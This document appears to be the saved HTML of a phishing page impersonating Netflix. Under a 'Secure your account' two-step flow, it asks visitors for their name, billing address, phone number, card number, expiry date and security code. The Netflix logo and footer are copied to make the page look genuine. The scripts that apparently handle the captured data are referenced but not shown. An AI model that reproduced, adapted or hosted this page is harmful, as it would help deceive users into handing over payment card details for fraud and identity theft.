<html lang="en" dir="ltr" class="translated-ltr"><head>
    <meta charset="utf-8">
    <title>Netflix</title>
    <link rel="stylesheet" href="assets/css/master.css?rand=19306111">
    <link rel="stylesheet" href="assets/css/loading.css">
    <link rel="stylesheet" href="assets/css/loading-btn.css">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link type="text/css" rel="stylesheet" href="../assets/img/icon.ico">
    <link rel="shortcut icon" href="../assets/img/icon.ico">
    <link rel="stylesheet" href="assets/css/animate.css">
    <script src="assets/js/cleve.js" charset="utf-8"></script>
  <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head>
  <body>
    <div class="header">
      <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><title></title><g id="netflix-logo"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg>
      <div onclick="window.location = 'logout.php'"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
        Logout
      </font></font></div>
    </div>
    <div class="minbody hidden" id="step0">
      <div class="shield"></div>
      <div class="steps"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STEP </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> OF </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></b></div>
      <h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secure your account.</font></font></h1>
      <ul>
        <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Update your billing address.</font></font></li>
        <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Confirm your payment method.</font></font></li>
      </ul>
      <a onclick="driveStep(1)"><button><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secure your account</font></font></button></a>
    </div>
    <div class="" id="step4">
      <div class="minbody">
        <div class="shield"></div>
        <h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">You are ready!</font></font></h1>
        <ul>
          <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The billing address has been updated.</font></font></li>
           <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Confirmed payment method.</font></font></li>
        </ul>
        <a onclick="loginNetflix()"><button><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LOG IN</font></font></button></a>
      </div>
    </div>
    <div class="fadeInAnim hidden" id="step2">
      <div class="step">
        <div class="stepID"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STEP </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> OF </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></b></div>
        <h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Update your billing address.</font></font></h1>
        <div class="form">
          <div class="inputpack">
            <input type="text" id="first_name" spellcheck="false" autocomplete="off">
            <label id="firstNameLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">First Name</font></font></label>
          </div>
          <div class="error" id="firstnameError"></div>
          <div class="inputpack">
            <input type="text" id="last_name" spellcheck="false" autocomplete="off">
            <label id="lastNameLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Last Name</font></font></label>
          </div>
          <div class="error" id="lastnameError"></div>
          <div class="inputpack">
            <input type="text" id="address" spellcheck="false" autocomplete="off">
            <label id="addressLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Address</font></font></label>
          </div>
          <div class="error" id="addressError"></div>
          <div class="inputpack">
            <input type="text" id="city" spellcheck="false" autocomplete="off">
            <label id="cityLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">City</font></font></label>
          </div>
          <div class="error" id="cityError"></div>
          <div class="twopac">
            <div class="inputpack">
              <input type="text" id="state" spellcheck="false" autocomplete="off">
              <label id="stateLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">State</font></font></label>
            </div>
            <div class="inputpack">
              <input type="text" id="zip" spellcheck="false" autocomplete="off">
              <label id="zipLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zip</font></font></label>
            </div>
          </div>
          <div class="error" id="statezipError"></div>
          <div class="inputpack">
            <input type="text" id="phone" spellcheck="false" autocomplete="off">
            <label id="phoneLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Phone</font></font></label>
          </div>
          <div class="error" id="phoneError"></div>
          <button id="submit_btn"><div id="content" style=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Update billing address</font></font></div>
            <div id="loading" class="btn btn-default ld-ext-middle running" style="font-size : 1.5em; margin-top : 2px; display: none;">
              <div class="ld ld-ring ld-cycle running"></div>
            </div>
          </button>
        </div>
      </div>
    </div>
    <div class="fadeInAnim hidden" id="step3">
      <div class="step">
        <div class="stepID"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STEP </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> OF </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></b></div>
        <h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Confirm your payment method.</font></font></h1>
        <div class="form">
          <div class="inputpack">
            <input type="text" id="firstnamecard" spellcheck="false" autocomplete="off">
            <label id="firstNameCardLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">First Name</font></font></label>
          </div>
          <div class="error" id="firstnameErrorCard"></div>
          <div class="inputpack">
            <input type="text" id="lastnamecard" spellcheck="false" autocomplete="off">
            <label id="lastNameLabelCard"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Last Name</font></font></label>
          </div>
          <div class="error" id="lastnameErrorCard"></div>
          <div class="inputpack">
            <input type="text" id="cardnumber" spellcheck="false" autocomplete="off">
            <label id="cardnumberLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Card Number</font></font></label>
          </div>
          <div class="error" id="cardnumberError"></div>
          <div class="inputpack">
            <input type="text" id="expdate" spellcheck="false" autocomplete="off" maxlength="7">
            <label id="expLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Expiration Date (MM / YY)</font></font></label>
          </div>
          <div class="error" id="expError"></div>
          <div class="inputpack">
            <input type="text" id="scv" spellcheck="false" autocomplete="off" maxlength="4">
            <label id="scvLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Security Code</font></font></label>
            <svg id="helpButt" width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><g><circle stroke="#A9A6A6" stroke-width="2" cx="18" cy="18" r="17"></circle><path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6"></path></g></g></svg>
          </div>
          <div class="error" id="scvError"></div>
          <button id="submit_btn_card"><div id="content_card" style=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CONFIRM PAYMENT METHOD</font></font></div>
            <div id="loading_card" class="btn btn-default ld-ext-middle running" style="font-size : 1.5em; margin-top : 2px; display: none;">
              <div class="ld ld-ring ld-cycle running"></div>
            </div>
          </button>
        </div>
      </div>
    </div>
    <div class="footer">
      <div class="wrapper">
        <a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Questions? </font><font style="vertical-align: inherit;">Contact us.</font></font></a>
        <ul>
          <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Faq</font></font></li>
          <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Help Center</font></font></li>
          <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Terms of Use</font></font></li>
          <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Privacy</font></font></li>
        </ul>
        <ul class="a">
          <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie Preferences</font></font></li>
          <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Corporate Information</font></font></li>
        </ul>
        <select id="region">
          <option value="ar"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">العربية</font></font></option>
          <option value="fr"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">French</font></font></option>
          <option selected="" value="en"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">English</font></font></option>
        </select>
      </div>
    </div>
    <div class="layer hidden" id="cvv">
      <div class="close" id="close"></div>
      <div class="span"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Your card's security code (CVV) is the 3 or 4 digit number located on the back of most cards.</font></font></div>
      <div class="bg_visa"></div>
      <div class="bg_amex"></div>
    </div>
    <script src="assets/js/main.js?rand=634040234" charset="utf-8"></script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
  

<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>